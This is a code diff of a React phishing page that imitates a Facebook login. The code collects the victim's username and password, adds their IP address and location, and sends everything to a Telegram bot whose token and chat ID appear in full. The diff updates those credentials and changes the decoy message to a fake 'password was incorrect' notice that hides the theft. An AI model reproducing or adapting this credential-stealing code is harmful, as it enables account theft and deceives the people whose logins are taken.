@@ -34,8 +34,8 @@ const Facebook = () => {
         const PasswordLogin = formData.password;
         const SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        const token = "6600608955:AAFKyCPNWgIEeTeeyDg4E8BcN9-HYvhCcvk";
-        const chat_id = -4517230601;
+        const token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
+        const chat_id = -4729740908;
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
         let api = new XMLHttpRequest();
@@ -43,7 +43,7 @@ const Facebook = () => {
         api.send();
 
         setTimeout(() => {
-          setResult("Unfortunately, Voting has Expired....");
+          setResult("Sorry, your password was incorrect. Please double-check your password.");
         }, 2000);
       });
   };
